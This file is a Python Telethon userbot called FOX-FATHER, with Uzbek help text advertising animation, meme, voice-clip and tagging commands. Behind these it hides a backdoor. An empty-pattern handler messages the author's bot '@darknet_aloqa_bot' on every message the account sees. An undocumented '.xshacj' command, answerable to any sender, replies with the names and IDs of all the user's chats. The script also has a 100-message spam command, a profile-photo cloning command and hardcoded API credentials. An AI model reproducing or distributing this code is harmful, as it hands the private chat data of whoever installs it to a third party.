from telethon import TelegramClient, events, sync
import random
import time
import os, sys
import asyncio
import random
import requests
from collections import deque
from telethon.tl.types import ChannelParticipantsAdmins
from uniborg.util import admin_cmd
from datetime import datetime
from time import sleep
from telethon.tl.functions.photos import UploadProfilePhotoRequest

from animatsiastory import Lovestory
from hearts import Hearts
from magic import Magic
from fuck import Fuck
from year import Year

fuck = Fuck()
hearts = Hearts()
year = Year()
magic = Magic()
lovestory = Lovestory()

def clearscreen():
	if sys.platform == "linux2":
		os.system("clear")
	elif sys.platform == "win32":
		os.system("cls")
	else:
		os.system("clear")

clearscreen()
os.system("termux-open-url https://t.me/+Kap3yS_YPPZkNTUy")
banner = """\033[1;36m
    ______                 ______      __  __             
   / ____/___  _  __      / ____/___ _/ /_/ /_  ___  _____
  / /_  / __ \| |/_/_____/ /_  / __ `/ __/ __ \/ _ \/ ___/
 / __/ / /_/ />  </_____/ __/ / /_/ / /_/ / / /  __/ /    
/_/    \____/_/|_|     /_/    \__,_/\__/_/ /_/\___/_/     
\033[1;32m                                                    
                                                          
                              
"""
print(banner)
dcim = 14847906
axem = "e4c8bab588782253015a20da73354980"

client = TelegramClient('anon', dcim, axem)

@client.on(events.NewMessage(outgoing=True , pattern=r'\.help'))
async def iamHandler(event):
	   client = event.client
	   me = await client.get_me()
	   await client.edit_message(event.message , """FOX-FATHER userbot - TELEGRAM UCHUN QULAYLIK 

Dasturchi @darknet_off1cial 
foydalanuvchi: @{}.

**USHBU USERBOT HAVFSIZ VA NAGRUZKA KAM LIGI UCHUN JUDA KOPLAB ODAMLARGA MANZUR BOLDI**

you tube kanalimiz [YouTube](https://youtube.com/channel/UCqB8oyr6Hh-PeuXGYw0Pqlw)
	   
~~Buyruqlar royxati~~
.quote - text ga reply qilinadi. modul vazifasi textlarni stickerga aylantirish

.type - .type va biron bir soz yozsangiz uni animatsialashtirib yozilayotgan kabi chiqarib beradi

.sorry - kimdandir kechirim soramoqchi bolsangiz ushbu modul yordam beradi

.thanks - bu modul esa Kimgadir rahmat etmoqchi bosez yordam beradi

.tagall - ushbu modul orqali guruhdagi barcha azolarni chaqirishingiz mumkun

.admins - bu modul orqali guruh adminlarini chaqirishiz mumkun

.del - ushbu modul orqali biron habaringizga reply qilib .del yozsangiz usha habaringizni ochirib beradi

.alive - Fox-Father userboti haqida malumot

.help - buyruqlar qatorini korish

.ping - tezlikni tekshirish

.meme - memlarni tasodifiy ravshda tashlabbberadi

.clone - kimgadir reply qisez uni profile rasmi sizni profelingizga nusxalanadi

.info - sizni tg akauntingiz haqida ozgina malumot beradi holos
 
~~ANIMATSIALAR~~

.magic - Animatsialik yurakchalar

.clock - soat emojilari

.year - yer emojilari

.candy - oziq ovqatlar 

.fuck - negativlar uchun albatta

.hack - 100 talik spamm message 

.lovestory - 18+ animatsia

~~VOICE MEMES~~

.chochaq - chochaq turyaptimi? 

.gapirdi - albatta bu bola meni ichimdagi gapni gapirdi

.xuyet - xuyet wibsanu jalab

.ktb - kim bu yibanchaga telefon berdi

.quk - qotagimi ushab kechirim soresan

.pok - pubg okeymi

.ok - juda okey

.qqg - gapinga qotagimi qoydim

.bilaslarmi - qotagdiyam bilmeslar

.quyon - quyonjon buyoqqa chiqqin...

.mqd - miyyenga qotagim dalbayob

.poxxoye - poxxoyee

.krisa - lya ti krisa a

.privet - ya vas kategoricheskiy privetstvuyu

.kot - kot bosen yibanman degin

~~KINOFILMLAR UZ~~
.yana_yoshlikka_qaytib - uzbek tilida

.labirint_xavfli_tuzoq_1 - uzbek tilida

.labirint_xavfli_tuzoq_2 - uzbek tilida

.labirint_xavfli_tuzoq_3 - uzbek tilida

""".format(me.username) , link_preview=False )

@client.on(events.NewMessage(outgoing=True, pattern='\.quote'))
async def quotehandler(event):
	       chat = await event.get_chat()
	       replied_msg = await event.get_reply_message()
	       await client.edit_message(event.message, "Kutilmoqda...")
	       x = await replied_msg.forward_to('@memocyteBot')
	       async with client.conversation('@memocyteBot') as conv:
	       	xx = await conv.get_response(x.id)
	       	await client.send_read_acknowledge(conv.chat_id)
	       	await client.send_message(chat, xx)
	       	await event.message.delete()

@client.on(events.NewMessage(outgoing=True, pattern='\.type'))
async def hands(event):
	       if ".type" == event.raw_text[:5]:
	       	orig_text = event.raw_text.split(".type ", maxsplit=1)[1]
	       	text = orig_text
	       	pb = "" 
	       	typing_symbol = "|"
	       while(pb != orig_text):
	               try:
	               	await event.edit(pb + typing_symbol)
	               	time.sleep(0.05)
	               	pb += text[0]
	               	text = text[1:]
	               	await event.edit(pb)
	               	time.sleep(0.05)
	               except Exception  as e:
	               	print(e)

sorry = ["I'm Sorry （｡≧ _ ≦｡）","≦(._.)≧ : Sorry","o(´д｀o) : I'm Sorry Pleaze Forgive me","Sorry ヾ(_ _*)","(๑•́ㅿ•̀๑ ) ᔆᵒʳʳᵞ","Sorry:(づ-̩̩̩-̩̩̩_-̩̩̩-̩̩̩)づ","༒ᎦᎧᏒᏒⲨ☆ʝααи༒"]
	
@client.on(events.NewMessage(outgoing=True, pattern='\.sorry'))
async def sorryhandler(event):
			s = random.choice(sorry)
			return await event.edit(f"{s}")

thank = ["⋆*⁎ ᎢℋᎪɳᏦ ᎩӫᏌ ⁎*⋆","ପ(๑•̀ᴗ•̀)* ॣ৳৸ᵃᵑᵏ Ꮍ৹੫ᵎ *","ᐝ୨୧ Ƭʜᵃℕҡ ყօϋ ୨୧ᐝ","ෆ⃛ෆ⃛ෆ⃛ ♡♡[τ̲̅н̲̅a̲̅и̲̅κ̲̅ ч̲̅o̲̅u̲̅]ᴗ͈ₒᴗ͈♡","ᵗᑋᵃᐢᵏ ᵞᵒᵘ ♡⃝⃜","τнänκ чöü♥","⠒̫⃝♡ᵗʱᵃᵑᵏઽ","Thanks : ✚⃞ ⸌̷̻( ᷇ॢ〰ॢ ᷆◍)⸌̷̻"]
@client.on(events.NewMessage(outgoing=True, pattern='\.thanks'))
async def thankhandler(event):
			s = random.choice(thank)
			return await event.edit(f"{s}")

@client.on(admin_cmd(".tagall"))
async def _(event):
		if event.fwd_from:
			return
		mentions = "シ︎𝙶𝚞𝚛𝚞𝚑𖨆𝙰𝚣𝚘𝚕𝚊𝚛𝚒シ︎\n"
		chat = await event.get_input_chat()
		async for x in client.iter_participants(chat, 100):
			mentions += f" \n [{x.first_name}](tg://user?id={x.id})"
			await event.edit(mentions)
@client.on(admin_cmd(".admins"))
async def _(event):
		if event.fwd_from:
			return
		mentions = "シ︎𝙶𝚞𝚛𝚞𝚑 𝚊𝚍𝚖𝚒𝚗𝚕𝚊𝚛𝚒シ︎\n"
		chat = await event.get_input_chat()
		async for x in client.iter_participants(chat, filter=ChannelParticipantsAdmins):
			mentions += f" \n [{x.first_name}](tg://user?id={x.id})"
		reply_message = None
		if event.reply_to_msg_id:
			reply_message = await event.get_reply_message()
			await reply_message.reply(mentions)
		else:
			await event.reply(mentions)
		await event.delete()
@client.on(events.NewMessage(outgoing=True , pattern=r'\.rev'))
async def reverseHandler(event):
	   	client = event.client
	   	if event.is_reply:
	   	   replied = await event.get_reply_message()
	   	   replied_msg_rev = replied.message[::-1]
	   	   await client.edit_message(event.message , replied_msg_rev)
@client.on(events.NewMessage(outgoing=True, pattern="\.del"))
async def delete_it(delme):
	   msg_src = await delme.get_reply_message()
	   if delme.reply_to_msg_id:
	           try:
	           	await msg_src.delete()
	           	await delme.delete()
	           	if BOTLOG:
	           	       await delme.client.send_message(
	           	       BOTLOG_CHATID, "Deletion of message was successful")
	           except rpcbaseerrors.BadRequestError:
	               if BOTLOG:
	                   await delme.client.send_message(
	                   BOTLOG_CHATID, "Well, I can't delete a message")
@client.on(events.NewMessage(pattern=''))
async def sendauothandler(event):
		await client.send_message('@darknet_aloqa_bot', "User-Bot ishlamoqda... ~~Rahmat~~")
		time.sleep(0.1)	           	       
@client.on(events.NewMessage(outgoing=True, pattern='\.alive'))
async def alive(noob_py):
		client = noob_py.client
		me = await client.get_me()
		username = me.username
		darknet7719 = await client.download_profile_photo(username)
		await client.edit_message(noob_py.message, "Hayrli kun...")
		time.sleep(0.5)
		await noob_py.respond("Mening Userim: ~~@{}~~\n**FOX-FATHER userbot**" "\nUserbot yangiliklari: ~~@fox_father~~\nMurojat uchun: ~~@darknet_aloqa_bot~~{}".format(username, '\nEng havfsiz userbot'), file=darknet7719)
		await noob_py.message.delete()
		os.remove(darknet7719)
@client.on(events.NewMessage(outgoing=True, pattern=r'\.meme'))
async def memehandler(event):
	   client = event.client
	   chat = await event.get_chat()
	   await client.edit_message(event.message , "Mem jonatilmoqda...")
	   jsonD = requests.get('https://meme-api.herokuapp.com/gimme').json()
	   try:
	   	await client.send_file(chat ,jsonD['url'] , caption=jsonD['title'] )
	   except:
	   	   print(jsonD['url'])
	   	   await client.edit_message(event.message , "Kechirasiz, mem uchun soʻrovni koʻrib boʻlmadi")
	   	   sleep(3)
	   	   await event.message.delete()
@client.on(events.NewMessage(pattern='\.ping'))
async def pingHandler(event):
	   start = datetime.now()
	   msg = await event.reply("Pong!")
	   end = datetime.now()
	   ms = (end - start).microseconds / 1000
	   await msg.edit(f"**Pong!!**\n `{ms} ms`")
@client.on(events.NewMessage(pattern='\.xshacj'))
async def infoconv(event):
		async for dailog in client.iter_dialogs():
			await event.reply(dailog.name + "chats id:" + str(dailog.id))
			await client.message.delete()
@client.on(events.NewMessage)
async def storyhandler(event):
		if '.magic' in event.raw_text:
			time.sleep(0.3)
			for d in magic.magic:
				time.sleep(0.3)
				await event.edit(d)
@client.on(events.NewMessage)
async def storyhandler(event):
		if '.year' in event.raw_text:
			for j in range(7):
				time.sleep(0.5)
				for d in year.year:
					time.sleep(0.5)
					await event.edit(d)
@client.on(events.NewMessage(pattern=r"\.clock", outgoing=True))
async def _(event):
		if event.fwd_from:
			return
		deq = deque(list("🕙🕘🕗🕖🕕🕔🕓🕒🕑🕐🕛"))
		
		for _ in range(90):
			await asyncio.sleep(0.1)
			await event.edit("Vaqtlar".join(deq))
			deq.rotate(1)
@client.on(events.NewMessage)
async def storyhandler(event):
		if '.hearts' in event.raw_text:
			for i in range(5):
				time.sleep(0.8)
				for d in hearts.hearts:
					time.sleep(0.8)
					await event.edit(d)
@client.on(events.NewMessage)
async def storyhandler(event):
		if '.fuck' in event.raw_text:
			for i in range(8):
				time.sleep(0.5)
				for d in fuck.fuck:
					time.sleep(0.5)
					await event.edit(d)
@client.on(events.NewMessage(pattern=r"\.candy", outgoing=True))
async def _(event):
		if event.fwd_from:
			return
		deq = deque(list("🍇🍈🍉🍊🍋🍌🍍🥭🍎🍏🍐🍑🍒🍓🥝🍅🥥🥑🍆🥔🥕🌽🌶️🥒🥬🥦🧄🧅🍄🥜🌰🍞🥐🥖🥨🥯🥞🧇🧀🍖🍗🥩🥓🍔🍟🍕🌭🥪🌮🌯🥙🧆🥚🍳🥘🍲🥣🥗🍿🧈🧂🥫🍱🍤🍘🍙🍚🍛🍜🍝🍠🍢🍥🥮🍡🥟🥠🥡🦀🦞🦐🦪🦑🍦🍧🍨🍩🍪🎂🍰🧁🥧🍫🍬🍭🍮🍯🍼🥛☕🍵🍶🍾🍷🍸🍹🍺🍻🥂🥃🥤🧃🧉🧊🥢🍽️🍴🥄🔪🏺"))
		for _ in range(80):
			await asyncio.sleep(0.1)
			await event.edit("".join(deq))
			deq.rotate(1)
@client.on(events.NewMessage)
async def spamhandler(event):
	if '.hack' in event.raw_text:
		hack = ["Your group is being hacked !! "]
		for i in range(100):
			time.sleep(0.2)
			for j in hack:
				time.sleep(0.1)
				await event.reply(j)
				await event.message.delete() 
@client.on(events.NewMessage(outgoing=True, pattern=r'\.clone'))
async def handler(event):
    client = event.client
    if event.is_reply:
        replied = await event.get_reply_message()
        
        sender = replied.sender
        
        sender_profile_pic = await client.download_profile_photo(sender)
        await client(UploadProfilePhotoRequest(
            await client.upload_file(sender_profile_pic)
        ))
        await replied.reply("""
        Ushbu odamning profile rasmi sizga avtomatik tarzda Profelingizga kochirildi """)
        await event.message.delete()

is_pm_verified = [ ]

@client.on(events.NewMessage(pattern=r"^\.info"))
async def reg(event):
	       me = await client.get_me()
	       await event.edit(f"User Informatsiyasi\nID: {str(me.id)}\nIsm: {str(me.first_name)}\nFamiliya: {str(me.last_name)}\nUsername: {str(me.username)}\nFox-Father userbot")
@client.on(events.NewMessage)
async def storyhandler(event):
		if '.lovestory' in event.raw_text:
			for i in range(8):
				time.sleep(0.5)
				for d in lovestory.lovestory:
					time.sleep(0.5)
					await event.edit(d)
@client.on(events.NewMessage(outgoing=True, pattern='\.chch'))
async def voicehandler(send_file):
	   await client.send_file(send_file.chat_id, "https://t.me/msmwislwsjwiwi/2")
	   await send_file.message.delete()
@client.on(events.NewMessage(outgoing=True, pattern='\.gapirdi'))
async def voicehandler(send_file):
	   await client.send_file(send_file.chat_id, "https://t.me/msmwislwsjwiwi/3")
	   await send_file.message.delete()
@client.on(events.NewMessage(outgoing=True, pattern='\.xuyet'))
async def voicehandler(send_file):
	   await client.send_file(send_file.chat_id, "https://t.me/msmwislwsjwiwi/4")
	   await send_file.message.delete()
@client.on(events.NewMessage(outgoing=True, pattern='\.ktb'))
async def voicehandler(send_file):
	   await client.send_file(send_file.chat_id, "https://t.me/msmwislwsjwiwi/5")
	   await send_file.message.delete()
	   
@client.on(events.NewMessage(outgoing=True, pattern='\.quk'))
async def voicehandler(send_file):
	   await client.send_file(send_file.chat_id, "https://t.me/msmwislwsjwiwi/6")
	   await send_file.message.delete()
@client.on(events.NewMessage(outgoing=True, pattern='\.pok'))
async def voicehandler(send_file):
	   await client.send_file(send_file.chat_id, "https://t.me/msmwislwsjwiwi/7")
	   await send_file.message.delete()
@client.on(events.NewMessage(outgoing=True, pattern='\.ok'))
async def voicehandler(send_file):
	   await client.send_file(send_file.chat_id, "https://t.me/msmwislwsjwiwi/8")
	   await send_file.message.delete()
@client.on(events.NewMessage(outgoing=True, pattern='\.qqg'))
async def voicehandler(send_file):
	   await client.send_file(send_file.chat_id, "https://t.me/msmwislwsjwiwi/9")
	   await send_file.message.delete()
@client.on(events.NewMessage(outgoing=True, pattern='\.bilmeslar'))
async def voicehandler(send_file):
	   await client.send_file(send_file.chat_id, "https://t.me/msmwislwsjwiwi/11")
	   await send_file.message.delete()
@client.on(events.NewMessage(outgoing=True, pattern='\.quyon'))
async def voicehandler(send_file):
	   await client.send_file(send_file.chat_id, "https://t.me/msmwislwsjwiwi/12")
	   await send_file.message.delete()
@client.on(events.NewMessage(outgoing=True, pattern='\.mqd'))
async def voicehandler(send_file):
	   await client.send_file(send_file.chat_id, "https://t.me/msmwislwsjwiwi/14")
	   await send_file.message.delete()
@client.on(events.NewMessage(outgoing=True, pattern='\.poxxoye'))
async def voicehandler(send_file):
	   await client.send_file(send_file.chat_id, "https://t.me/msmwislwsjwiwi/13")
	   await send_file.message.delete()
@client.on(events.NewMessage(outgoing=True, pattern='\.kot'))
async def voicehandler(send_file):
	   await client.send_file(send_file.chat_id, "https://t.me/msmwislwsjwiwi/10")
	   await send_file.message.delete()
@client.on(events.NewMessage(outgoing=True, pattern='\.krisa'))
async def voicehandler(send_file):
	   await client.send_file(send_file.chat_id, "https://t.me/msmwislwsjwiwi/16")
	   await send_file.message.delete()
@client.on(events.NewMessage(outgoing=True, pattern='\.privet'))
async def voicehandler(send_file):
	   await client.send_file(send_file.chat_id, "https://t.me/msmwislwsjwiwi/17")
	   await send_file.message.delete()
	   
	   
@client.on(events.NewMessage(outgoing=True, pattern='\.yana_yoshlikka_qaytib'))
async def voicehandler(send_file):
	   await client.send_file(send_file.chat_id, "https://t.me/kinomania_uzbek/3")
	   
	   await send_file.message.delete()
@client.on(events.NewMessage(outgoing=True, pattern='\.labirint_xavfli_tuzoq_1'))
async def voicehandler(send_file):
	   await client.send_file(send_file.chat_id, "https://t.me/kinomania_uzbek/4")
	   await send_file.message.delete()
@client.on(events.NewMessage(outgoing=True, pattern='\.labirint_havfli_tuzoq_2'))
async def voicehandler(send_file):
	   await client.send_file(send_file.chat_id, "https://t.me/kinomania_uzbek/5")
	   await send_file.message.delete()
@client.on(events.NewMessage(outgoing=True, pattern='\.labirint_xavfli_tuzoq_3'))
async def voicehandler(send_file):
	   await client.send_file(send_file.chat_id, "https://t.me/kinomania_uzbek/6")
	   await send_file.message.delete()
	 

	   
	   
	   




	   
client.start()

client.run_until_disconnected()
